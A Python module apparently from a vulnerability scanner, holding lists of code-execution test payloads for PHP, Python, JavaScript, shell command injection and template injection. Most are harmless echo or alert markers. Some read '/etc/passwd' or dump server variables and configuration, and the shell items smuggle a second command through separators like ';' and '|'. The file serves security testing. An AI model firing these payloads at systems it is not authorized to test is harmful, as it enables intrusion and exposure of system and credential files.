"""
Code Execution payloads
Contains payloads for testing code execution vulnerabilities
"""

class CodeExecutionPayloads:
    """Code Execution payload collection"""
    
    @staticmethod
    def get_all_payloads():
        """Get all code execution payloads"""
        return (CodeExecutionPayloads.get_php_payloads() + 
                CodeExecutionPayloads.get_python_payloads() +
                CodeExecutionPayloads.get_javascript_payloads() +
                CodeExecutionPayloads.get_system_command_payloads())
    
    @staticmethod
    def get_php_payloads():
        """Get PHP code execution payloads"""
        return [
            "<?php echo 'DOMINATOR_PHP_EXEC_TEST'; ?>",
            "<?php system('echo DOMINATOR_PHP_SYSTEM'); ?>",
            "<?php exec('echo DOMINATOR_PHP_EXEC'); ?>",
            "<?php passthru('echo DOMINATOR_PHP_PASSTHRU'); ?>",
            "<?php shell_exec('echo DOMINATOR_PHP_SHELL'); ?>",
            "<?php `echo DOMINATOR_PHP_BACKTICK`; ?>",
            "<?php eval('echo \"DOMINATOR_PHP_EVAL\";'); ?>",
            "<?php assert('echo \"DOMINATOR_PHP_ASSERT\";'); ?>",
            "<?php include('/etc/passwd'); ?>",
            "<?php require('/etc/passwd'); ?>",
            "<?php file_get_contents('/etc/passwd'); ?>",
            "<?php readfile('/etc/passwd'); ?>",
            "<?php phpinfo(); ?>",
            "<?php var_dump($_SERVER); ?>",
            "<?php print_r(get_defined_vars()); ?>"
        ]
    
    @staticmethod
    def get_python_payloads():
        """Get Python code execution payloads"""
        return [
            "__import__('os').system('echo DOMINATOR_PYTHON_EXEC')",
            "exec('print(\"DOMINATOR_PYTHON_EXEC\")')",
            "eval('print(\"DOMINATOR_PYTHON_EVAL\")')",
            "__import__('subprocess').call(['echo', 'DOMINATOR_PYTHON_SUBPROCESS'])",
            "open('/etc/passwd').read()",
            "__import__('os').popen('echo DOMINATOR_PYTHON_POPEN').read()",
            "compile('print(\"DOMINATOR_PYTHON_COMPILE\")', '<string>', 'exec')",
            "__import__('os').listdir('/')",
            "__import__('sys').exit()",
            "vars()",
            "dir()",
            "globals()",
            "locals()"
        ]
    
    @staticmethod
    def get_javascript_payloads():
        """Get JavaScript code execution payloads"""
        return [
            "eval('alert(\"DOMINATOR_JS_EVAL\")')",
            "Function('alert(\"DOMINATOR_JS_FUNCTION\")')();",
            "setTimeout('alert(\"DOMINATOR_JS_TIMEOUT\")', 0)",
            "setInterval('alert(\"DOMINATOR_JS_INTERVAL\")', 1000)",
            "new Function('alert(\"DOMINATOR_JS_NEW_FUNCTION\")')();",
            "window['eval']('alert(\"DOMINATOR_JS_WINDOW_EVAL\")')",
            "this['eval']('alert(\"DOMINATOR_JS_THIS_EVAL\")')",
            "globalThis['eval']('alert(\"DOMINATOR_JS_GLOBAL_EVAL\")')",
            "constructor.constructor('alert(\"DOMINATOR_JS_CONSTRUCTOR\")')();",
            "String.fromCharCode(97,108,101,114,116,40,34,68,79,77,73,78,65,84,79,82,34,41)"
        ]
    
    @staticmethod
    def get_system_command_payloads():
        """Get system command execution payloads"""
        return [
            "; echo DOMINATOR_CMD_EXEC",
            "| echo DOMINATOR_CMD_EXEC",
            "& echo DOMINATOR_CMD_EXEC",
            "&& echo DOMINATOR_CMD_EXEC",
            "|| echo DOMINATOR_CMD_EXEC",
            "`echo DOMINATOR_CMD_EXEC`",
            "$(echo DOMINATOR_CMD_EXEC)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; ls -la",
            "| ls -la",
            "; whoami",
            "| whoami",
            "; id",
            "| id",
            "; pwd",
            "| pwd"
        ]
    
    @staticmethod
    def get_template_injection_payloads():
        """Get template injection payloads"""
        return [
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
            "{%7*7%}",
            "{{config}}",
            "{{request}}",
            "{{session}}",
            "${java.lang.Runtime}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{config.items()}}"
        ]
